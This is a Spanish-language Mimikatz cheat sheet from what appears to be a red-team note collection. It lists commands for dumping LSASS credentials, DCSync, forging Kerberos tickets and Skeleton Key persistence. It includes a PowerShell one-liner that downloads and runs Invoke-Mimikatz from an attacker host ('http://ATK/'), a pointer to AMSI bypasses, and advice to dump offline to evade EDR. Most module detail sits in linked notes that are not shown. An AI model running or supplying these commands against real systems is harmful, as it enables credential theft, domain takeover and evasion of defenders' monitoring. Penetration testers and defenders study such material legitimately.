---
aliases:
  - Mimikatz Commands
tags:
  - technique/credential-access
  - technique/persistence
  - env/windows
  - asset/active-directory
  - tool/mimikatz
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: CheatSheet
linked:
  - "[[Mimikatz - sekurlsa]]"
  - "[[Mimikatz - lsadump]]"
  - "[[Mimikatz - kerberos y token]]"
  - "[[Mimikatz - Dump y PPL Bypass]]"
  - "[[LSASS Dumping]]"
  - "[[DCSync]]"
  - "[[Golden Ticket]]"
---
# Mimikatz Cheatsheet

**Mimikatz** (gentilkiwi) es la navaja suiza de credential access en Windows: dump de LSASS, SAM/LSA secrets, DCSync, forja de tickets Kerberos, manipulación de tokens, DPAPI y persistencia. Comandos organizados por módulo.

---

## Setup

```cmd
:: Interactivo
mimikatz.exe

:: Scripted
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

:: PowerShell reflection (cuidado AMSI → ver [[AMSI Bypasses]])
IEX(New-Object Net.WebClient).DownloadString('http://ATK/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords"
```

> Casi todo requiere `privilege::debug` (SeDebugPrivilege) + admin local.

---

## Cheatsheet

### 1. sekurlsa (Credenciales en Memoria)

````tabs
tab: **Dump de Credenciales**
![[Mimikatz - sekurlsa#^mimi-sekurlsa]]

tab: **Tickets y PtH**
![[Mimikatz - sekurlsa#^mimi-sekurlsa-pth]]
````

### 2. lsadump (SAM / LSA / DCSync)

````tabs
tab: **SAM / LSA / Cache**
![[Mimikatz - lsadump#^mimi-lsadump-local]]

tab: **Desde Hives (offline)**
![[Mimikatz - lsadump#^mimi-lsadump-offline]]

tab: **DCSync**
![[Mimikatz - lsadump#^mimi-lsadump-dcsync]]
````

### 3. kerberos y token

````tabs
tab: **Kerberos (forge / PtT)**
![[Mimikatz - kerberos y token#^mimi-kerberos]]

tab: **Token (impersonación)**
![[Mimikatz - kerberos y token#^mimi-token]]
````

### 4. Dump y PPL Bypass

````tabs
tab: **Dump LSASS + Offline**
![[Mimikatz - Dump y PPL Bypass#^mimi-dump]]

tab: **Bypass PPL**
![[Mimikatz - Dump y PPL Bypass#^mimi-ppl]]

tab: **DPAPI / Crypto**
![[Mimikatz - Dump y PPL Bypass#^mimi-dpapi]]
````

---

## Overview

| Módulo | Para qué |
|:---|:---|
| `privilege::debug` | Habilitar SeDebugPrivilege (casi siempre primero) |
| `sekurlsa::` | Credenciales en memoria (LSASS) |
| `lsadump::` | SAM, LSA secrets, cache, **DCSync** |
| `kerberos::` | Golden/Silver ticket, Pass-the-Ticket |
| `token::` | Elevar a SYSTEM / impersonar |
| `vault::` / `dpapi::` | Credential Manager, DPAPI, browser creds |
| `crypto::` | Export de certificados |
| `misc::skeleton` | Skeleton Key (persistencia, ver [[Skeleton Key]]) |

**Persistencia** (Skeleton Key, DSRM, Custom SSP) tienen notas propias. **Dump de LSASS** detallado: [[LSASS Dumping]].

> [!warning] Detección
> `sekurlsa::logonpasswords` abre handle sobre LSASS (`4673/4674`); `lsadump::dcsync` genera `4662` con GUID de replicación en el DC. Preferir dump offline (comsvcs/procdump) + parse en tu máquina para evadir EDR.

---

## Recursos

- [Mimikatz Wiki (oficial)](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity — Mimikatz](https://adsecurity.org/?page_id=1821)
- [pypykatz](https://github.com/skelsec/pypykatz) — alternativa Python offline.
